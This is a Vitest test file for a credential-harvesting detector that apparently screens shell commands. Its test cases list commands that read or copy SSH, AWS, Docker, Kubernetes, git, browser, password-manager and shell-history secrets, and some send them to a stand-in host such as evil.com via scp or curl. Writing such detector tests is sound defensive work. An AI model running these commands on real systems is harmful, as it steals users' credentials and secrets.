import { describe, it, expect } from 'vitest';
import { detectCredentialHarvesting } from '../credential-harvesting';

describe('detectCredentialHarvesting', () => {
  describe('SSH key harvesting', () => {
    it('should detect reading SSH private keys', async () => {
      const testCases = [
        'cat ~/.ssh/id_rsa',
        'cat ~/.ssh/id_dsa',
        'cat ~/.ssh/id_ecdsa',
        'cat ~/.ssh/id_ed25519',
        'less ~/.ssh/id_rsa',
        'more ~/.ssh/id_rsa',
        'head ~/.ssh/id_rsa',
        'tail ~/.ssh/id_rsa',
      ];

      for (const command of testCases) {
        const result = await detectCredentialHarvesting({ command });
        expect(result).not.toBeNull();
        expect(result?.severity).toBe('high');
        expect(result?.detector).toBe('credential-harvesting');
        expect(result?.message).toContain('SSH private keys');
      }
    });

    it('should detect copying SSH private keys', async () => {
      const testCases = [
        'cp ~/.ssh/id_rsa /tmp/stolen',
        'scp ~/.ssh/id_rsa user@evil.com:',
        'mv ~/.ssh/id_rsa /tmp/',
        'tar czf keys.tar.gz ~/.ssh/id_rsa',
        'zip keys.zip ~/.ssh/id_rsa',
      ];

      for (const command of testCases) {
        const result = await detectCredentialHarvesting({ command });
        expect(result).not.toBeNull();
        expect(result?.severity).toBe('high');
      }
    });

    it('should detect encoding SSH keys for exfiltration', async () => {
      const testCases = [
        'base64 ~/.ssh/id_rsa',
        'cat ~/.ssh/id_rsa | base64',
        'cat ~/.ssh/id_rsa | base64 | curl -d @- http://evil.com',
      ];

      for (const command of testCases) {
        const result = await detectCredentialHarvesting({ command });
        expect(result).not.toBeNull();
        expect(result?.severity).toBe('high');
      }
    });

    it('should detect bulk SSH directory access', async () => {
      const testCases = [
        'cat ~/.ssh/*',
        'tar czf ssh-backup.tar.gz ~/.ssh',
        'zip -r ssh.zip ~/.ssh',
      ];

      for (const command of testCases) {
        const result = await detectCredentialHarvesting({ command });
        expect(result).not.toBeNull();
        expect(result?.severity).toBe('high');
      }
    });

    it('should NOT detect safe SSH operations', async () => {
      const testCases = [
        'ssh-keygen -t rsa',
        'ssh-keygen -t ed25519 -C "email@example.com"',
        'cat ~/.ssh/id_rsa.pub',
        'cat ~/.ssh/authorized_keys',
        'cat ~/.ssh/known_hosts',
        'cat ~/.ssh/config',
        'ssh-add -l',
        'ssh-add -L',
        'ls -la ~/.ssh',
      ];

      for (const command of testCases) {
        const result = await detectCredentialHarvesting({ command });
        expect(result).toBeNull();
      }
    });
  });

  describe('AWS credential harvesting', () => {
    it('should detect reading AWS credentials', async () => {
      const testCases = [
        'cat ~/.aws/credentials',
        'cat ~/.aws/config',
        'less ~/.aws/credentials',
        'more ~/.aws/credentials',
        'head ~/.aws/credentials',
        'tail ~/.aws/credentials',
      ];

      for (const command of testCases) {
        const result = await detectCredentialHarvesting({ command });
        expect(result).not.toBeNull();
        expect(result?.severity).toBe('high');
        expect(result?.message).toContain('AWS credentials');
      }
    });

    it('should detect copying AWS credentials', async () => {
      const testCases = [
        'cp ~/.aws/credentials /tmp/',
        'scp ~/.aws/credentials user@evil.com:',
        'tar czf aws.tar.gz ~/.aws',
        'zip -r aws.zip ~/.aws',
      ];

      for (const command of testCases) {
        const result = await detectCredentialHarvesting({ command });
        expect(result).not.toBeNull();
        expect(result?.severity).toBe('high');
      }
    });

    it('should detect encoding AWS credentials', async () => {
      const testCases = [
        'base64 ~/.aws/credentials',
        'cat ~/.aws/credentials | base64',
      ];

      for (const command of testCases) {
        const result = await detectCredentialHarvesting({ command });
        expect(result).not.toBeNull();
        expect(result?.severity).toBe('high');
      }
    });
  });

  describe('Browser credential harvesting', () => {
    it('should detect accessing Chrome password database', async () => {
      const testCases = [
        'cat ~/Library/Application\\ Support/Google/Chrome/Default/Login\\ Data',
        'cp ~/Library/Application\\ Support/Google/Chrome/Default/Login\\ Data /tmp/',
        'sqlite3 ~/Library/Application\\ Support/Google/Chrome/Default/Login\\ Data',
        'cat ~/.config/chromium/Default/Login\\ Data',
      ];

      for (const command of testCases) {
        const result = await detectCredentialHarvesting({ command });
        expect(result).not.toBeNull();
        expect(result?.severity).toBe('high');
        expect(result?.message).toContain('browser stored passwords');
      }
    });

    it('should detect accessing Firefox password database', async () => {
      const testCases = [
        'cat ~/.mozilla/firefox/profile/logins.json',
        'cat ~/.mozilla/firefox/profile/key3.db',
        'cat ~/.mozilla/firefox/profile/key4.db',
        'cp ~/.mozilla/firefox/profile/logins.json /tmp/',
        'sqlite3 ~/.mozilla/firefox/profile/signons.sqlite',
      ];

      for (const command of testCases) {
        const result = await detectCredentialHarvesting({ command });
        expect(result).not.toBeNull();
        expect(result?.severity).toBe('high');
      }
    });

    it('should detect searching for browser credentials', async () => {
      const testCases = [
        'find ~ -name "Login Data" -path "*Chrome*"',
        'locate Chrome Login Data',
        'find ~/.mozilla/firefox -name "logins.json"',
      ];

      for (const command of testCases) {
        const result = await detectCredentialHarvesting({ command });
        expect(result).not.toBeNull();
        expect(result?.severity).toBe('high');
      }
    });
  });

  describe('Docker credential harvesting', () => {
    it('should detect reading Docker config', async () => {
      const testCases = [
        'cat ~/.docker/config.json',
        'less ~/.docker/config.json',
        'more ~/.docker/config.json',
        'jq . ~/.docker/config.json',
      ];

      for (const command of testCases) {
        const result = await detectCredentialHarvesting({ command });
        expect(result).not.toBeNull();
        expect(result?.severity).toBe('high');
        expect(result?.message).toContain('Docker credentials');
      }
    });

    it('should detect copying Docker credentials', async () => {
      const testCases = [
        'cp ~/.docker/config.json /tmp/',
        'scp ~/.docker/config.json user@evil.com:',
      ];

      for (const command of testCases) {
        const result = await detectCredentialHarvesting({ command });
        expect(result).not.toBeNull();
        expect(result?.severity).toBe('high');
      }
    });

    it('should detect encoding Docker credentials', async () => {
      const testCases = [
        'base64 ~/.docker/config.json',
        'cat ~/.docker/config.json | base64',
      ];

      for (const command of testCases) {
        const result = await detectCredentialHarvesting({ command });
        expect(result).not.toBeNull();
        expect(result?.severity).toBe('high');
      }
    });
  });

  describe('Kubernetes credential harvesting', () => {
    it('should detect reading kubeconfig', async () => {
      const testCases = [
        'cat ~/.kube/config',
        'less ~/.kube/config',
        'more ~/.kube/config',
        'head ~/.kube/config',
        'tail ~/.kube/config',
      ];

      for (const command of testCases) {
        const result = await detectCredentialHarvesting({ command });
        expect(result).not.toBeNull();
        expect(result?.severity).toBe('high');
        expect(result?.message).toContain('Kubernetes credentials');
      }
    });

    it('should detect copying kubeconfig', async () => {
      const testCases = [
        'cp ~/.kube/config /tmp/',
        'scp ~/.kube/config user@evil.com:',
        'tar czf kube.tar.gz ~/.kube',
        'zip -r kube.zip ~/.kube',
      ];

      for (const command of testCases) {
        const result = await detectCredentialHarvesting({ command });
        expect(result).not.toBeNull();
        expect(result?.severity).toBe('high');
      }
    });

    it('should detect encoding kubeconfig', async () => {
      const testCases = [
        'base64 ~/.kube/config',
        'cat ~/.kube/config | base64',
      ];

      for (const command of testCases) {
        const result = await detectCredentialHarvesting({ command });
        expect(result).not.toBeNull();
        expect(result?.severity).toBe('high');
      }
    });

    it('should detect unsafe kubectl config view', async () => {
      const result = await detectCredentialHarvesting({
        command: 'kubectl config view',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should NOT detect safe kubectl operations', async () => {
      const testCases = [
        'kubectl config view --minify',
        'kubectl config view --flatten',
        'kubectl config get-contexts',
        'kubectl config current-context',
      ];

      for (const command of testCases) {
        const result = await detectCredentialHarvesting({ command });
        expect(result).toBeNull();
      }
    });
  });

  describe('Git credential harvesting', () => {
    it('should detect reading git credentials', async () => {
      const testCases = [
        'cat ~/.git-credentials',
        'cat ~/.gitconfig',
        'less ~/.git-credentials',
        'more ~/.git-credentials',
      ];

      for (const command of testCases) {
        const result = await detectCredentialHarvesting({ command });
        expect(result).not.toBeNull();
        expect(result?.severity).toBe('high');
        expect(result?.message).toContain('Git credentials');
      }
    });

    it('should detect git credential helper extraction', async () => {
      const testCases = [
        'git config --get credential.helper',
        'git credential fill',
      ];

      for (const command of testCases) {
        const result = await detectCredentialHarvesting({ command });
        expect(result).not.toBeNull();
        expect(result?.severity).toBe('high');
      }
    });

    it('should detect copying git credentials', async () => {
      const testCases = [
        'cp ~/.git-credentials /tmp/',
        'scp ~/.git-credentials user@evil.com:',
      ];

      for (const command of testCases) {
        const result = await detectCredentialHarvesting({ command });
        expect(result).not.toBeNull();
        expect(result?.severity).toBe('high');
      }
    });

    it('should NOT detect safe git operations', async () => {
      const testCases = [
        'git config --list',
        'git config user.name',
        'git config user.email',
        'git config core.editor',
        'git status',
        'git log',
        'git diff',
        'git remote -v',
      ];

      for (const command of testCases) {
        const result = await detectCredentialHarvesting({ command });
        expect(result).toBeNull();
      }
    });
  });

  describe('Shell history harvesting', () => {
    it('should detect reading shell history', async () => {
      const testCases = [
        'cat ~/.bash_history',
        'cat ~/.zsh_history',
        'cat ~/.history',
        'cat ~/.sh_history',
        'less ~/.bash_history',
        'more ~/.bash_history',
        'grep password ~/.bash_history',
        'grep secret ~/.zsh_history',
      ];

      for (const command of testCases) {
        const result = await detectCredentialHarvesting({ command });
        expect(result).not.toBeNull();
        expect(result?.severity).toBe('high');
        expect(result?.message).toContain('shell history');
      }
    });

    it('should detect copying shell history', async () => {
      const testCases = [
        'cp ~/.bash_history /tmp/',
        'scp ~/.bash_history user@evil.com:',
        'cp ~/.zsh_history /tmp/',
        'scp ~/.zsh_history user@evil.com:',
      ];

      for (const command of testCases) {
        const result = await detectCredentialHarvesting({ command });
        expect(result).not.toBeNull();
        expect(result?.severity).toBe('high');
      }
    });

    it('should detect encoding shell history', async () => {
      const testCases = [
        'base64 ~/.bash_history',
        'cat ~/.bash_history | base64',
      ];

      for (const command of testCases) {
        const result = await detectCredentialHarvesting({ command });
        expect(result).not.toBeNull();
        expect(result?.severity).toBe('high');
      }
    });
  });

  describe('Process memory harvesting', () => {
    it('should detect reading process environment', async () => {
      const testCases = [
        'cat /proc/1234/environ',
        'cat /proc/$PID/environ',
        'strings /proc/1234/environ',
      ];

      for (const command of testCases) {
        const result = await detectCredentialHarvesting({ command });
        expect(result).not.toBeNull();
        expect(result?.severity).toBe('high');
        expect(result?.message).toContain('process memory');
      }
    });

    it('should detect reading process cmdline', async () => {
      const testCases = [
        'cat /proc/1234/cmdline',
        'cat /proc/$PID/cmdline',
      ];

      for (const command of testCases) {
        const result = await detectCredentialHarvesting({ command });
        expect(result).not.toBeNull();
        expect(result?.severity).toBe('high');
      }
    });

    it('should detect bulk process scraping', async () => {
      const testCases = [
        'for pid in /proc/[0-9]*; do cat $pid/environ; done',
        'find /proc -name environ',
        'find /proc -name cmdline',
      ];

      for (const command of testCases) {
        const result = await detectCredentialHarvesting({ command });
        expect(result).not.toBeNull();
        expect(result?.severity).toBe('high');
      }
    });

    it('should detect process memory dumps', async () => {
      const testCases = ['gcore 1234', 'gdb -p 1234'];

      for (const command of testCases) {
        const result = await detectCredentialHarvesting({ command });
        expect(result).not.toBeNull();
        expect(result?.severity).toBe('high');
      }
    });
  });

  describe('Password manager harvesting', () => {
    it('should detect accessing 1Password database', async () => {
      const testCases = [
        'cat ~/Library/Group\\ Containers/2BUA8C4S2C.com.1password/1Password.sqlite',
        'sqlite3 ~/Library/1Password/1Password.sqlite',
        'find ~ -name "*1Password*.sqlite"',
      ];

      for (const command of testCases) {
        const result = await detectCredentialHarvesting({ command });
        expect(result).not.toBeNull();
        expect(result?.severity).toBe('high');
        expect(result?.message).toContain('password manager');
      }
    });

    it('should detect accessing LastPass data', async () => {
      const testCases = [
        'cat ~/.config/LastPass/LastPass.lpl',
        'find ~ -name "*LastPass*"',
      ];

      for (const command of testCases) {
        const result = await detectCredentialHarvesting({ command });
        expect(result).not.toBeNull();
        expect(result?.severity).toBe('high');
      }
    });

    it('should detect accessing KeePass databases', async () => {
      const testCases = [
        'cat ~/passwords.kdbx',
        'cp ~/vault.kdb /tmp/',
        'find ~ -name "*.kdbx"',
      ];

      for (const command of testCases) {
        const result = await detectCredentialHarvesting({ command });
        expect(result).not.toBeNull();
        expect(result?.severity).toBe('high');
      }
    });

    it('should detect accessing pass (password-store)', async () => {
      const testCases = [
        'cat ~/.password-store/work/email.gpg',
        'find ~/.password-store',
        'gpg -d ~/.password-store/github.gpg',
      ];

      for (const command of testCases) {
        const result = await detectCredentialHarvesting({ command });
        expect(result).not.toBeNull();
        expect(result?.severity).toBe('high');
      }
    });
  });

  describe('Database config harvesting', () => {
    it('should detect reading MySQL config', async () => {
      const testCases = [
        'cat ~/.my.cnf',
        'cat /etc/mysql/my.cnf',
        'grep password ~/.my.cnf',
      ];

      for (const command of testCases) {
        const result = await detectCredentialHarvesting({ command });
        expect(result).not.toBeNull();
        expect(result?.severity).toBe('high');
        expect(result?.message).toContain('database configuration');
      }
    });

    it('should detect reading PostgreSQL config', async () => {
      const testCases = [
        'cat ~/.pgpass',
        'cat /etc/postgresql/postgresql.conf',
      ];

      for (const command of testCases) {
        const result = await detectCredentialHarvesting({ command });
        expect(result).not.toBeNull();
        expect(result?.severity).toBe('high');
      }
    });

    it('should detect reading MongoDB config', async () => {
      const testCases = [
        'cat /etc/mongod.conf',
        'grep password /etc/mongod.conf',
      ];

      for (const command of testCases) {
        const result = await detectCredentialHarvesting({ command });
        expect(result).not.toBeNull();
        expect(result?.severity).toBe('high');
      }
    });

    it('should detect reading Redis config', async () => {
      const testCases = [
        'cat /etc/redis/redis.conf',
        'grep requirepass /etc/redis/redis.conf',
      ];

      for (const command of testCases) {
        const result = await detectCredentialHarvesting({ command });
        expect(result).not.toBeNull();
        expect(result?.severity).toBe('high');
      }
    });

    it('should detect reading generic database configs', async () => {
      const testCases = [
        'cat config/database.yml',
        'cat /etc/db.conf',
        'grep password config.conf',
      ];

      for (const command of testCases) {
        const result = await detectCredentialHarvesting({ command });
        expect(result).not.toBeNull();
        expect(result?.severity).toBe('high');
      }
    });
  });

  describe('Configuration', () => {
    it('should respect enabled flag', async () => {
      const result = await detectCredentialHarvesting(
        { command: 'cat ~/.ssh/id_rsa' },
        { enabled: false, severity: 'high' }
      );

      expect(result).toBeNull();
    });

    it('should use custom severity', async () => {
      const result = await detectCredentialHarvesting(
        { command: 'cat ~/.ssh/id_rsa' },
        { enabled: true, severity: 'medium' }
      );

      expect(result).not.toBeNull();
      expect(result?.severity).toBe('medium');
    });
  });
});
